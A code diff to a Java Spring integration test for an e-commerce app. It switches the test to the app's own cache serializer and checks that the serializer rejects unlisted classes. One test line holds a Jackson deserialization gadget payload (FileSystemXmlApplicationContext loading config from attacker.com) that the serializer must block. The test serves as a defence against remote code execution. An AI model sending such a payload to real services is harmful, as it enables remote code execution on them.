@@ -41,8 +41,8 @@ class CloudAndMonitoringIntegrationTest {
     @Autowired
     private MockMvc mockMvc;
 
-    @Autowired
-    private CacheConfig cacheConfig;
+    // Prueba explícita de la configuración real, sin inyectar un bean excluido por test.
+    private final CacheConfig cacheConfig = new CacheConfig();
 
     @Test
     @DisplayName("Actuator: /actuator/health es público y responde UP")
@@ -124,24 +124,13 @@ class CloudAndMonitoringIntegrationTest {
         var manager = cacheConfig.cacheManager(mockFactory);
         assertNotNull(manager);
 
-        // ObjectMapper seguro con BasicPolymorphicTypeValidator anti-RCE
-        ObjectMapper om = new ObjectMapper();
-        om.registerModule(new JavaTimeModule());
-        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
-                .allowIfBaseType(Object.class)
-                .allowIfSubType("com.tienda.ecommerce.")
-                .allowIfSubType("java.util.")
-                .allowIfSubType("java.time.")
-                .allowIfSubType("java.math.")
-                .allowIfSubType("java.lang.")
-                .build();
-        om.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
+        var serializer = CacheConfig.catalogSerializer();
 
         // 1. CategoriaResponse
         CategoriaResponse cat = new CategoriaResponse(1L, "Audio", "Equipos de sonido");
-        String jsonCat = om.writeValueAsString(cat);
+        String jsonCat = new String(serializer.serialize(cat), java.nio.charset.StandardCharsets.UTF_8);
         assertTrue(jsonCat.contains("@class"), "Debe incluir información de tipo para Jackson polymorphic typing");
-        CategoriaResponse deserializedCat = (CategoriaResponse) om.readValue(jsonCat, Object.class);
+        CategoriaResponse deserializedCat = (CategoriaResponse) serializer.deserialize(serializer.serialize(cat));
         assertEquals(cat.getId(), deserializedCat.getId());
         assertEquals(cat.getNombre(), deserializedCat.getNombre());
 
@@ -151,16 +140,21 @@ class CloudAndMonitoringIntegrationTest {
                 new BigDecimal("99.90"), 10, "img.jpg",
                 List.of("img.jpg", "img2.jpg"), 1L, "Audio", true, LocalDateTime.now()
         );
-        String jsonProd = om.writeValueAsString(prod);
+        String jsonProd = new String(serializer.serialize(prod), java.nio.charset.StandardCharsets.UTF_8);
         assertTrue(jsonProd.contains("@class"));
-        ProductoResponse deserializedProd = (ProductoResponse) om.readValue(jsonProd, Object.class);
+        ProductoResponse deserializedProd = (ProductoResponse) serializer.deserialize(serializer.serialize(prod));
         assertEquals(prod.getId(), deserializedProd.getId());
         assertEquals(prod.getNombre(), deserializedProd.getNombre());
         assertEquals(prod.getImagenes().size(), deserializedProd.getImagenes().size());
 
         // 3. Intento de deserialización de clase no permitida (Mitigación RCE)
         String maliciousPayload = "{\"@class\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://attacker.com\"}";
-        assertThrows(Exception.class, () -> om.readValue(maliciousPayload, Object.class));
+        assertThrows(Exception.class, () -> serializer.deserialize(maliciousPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+        // Una clase inocua pero fuera de la lista también debe ser rechazada.
+        assertThrows(Exception.class, () -> serializer.deserialize(
+                "{\"@class\":\"java.util.Date\",\"value\":0}".getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+        var lista = List.of(cat).stream().toList();
+        assertEquals("Audio", ((CategoriaResponse) ((List<?>) serializer.deserialize(serializer.serialize(lista))).get(0)).getNombre());
     }
 
     @Test
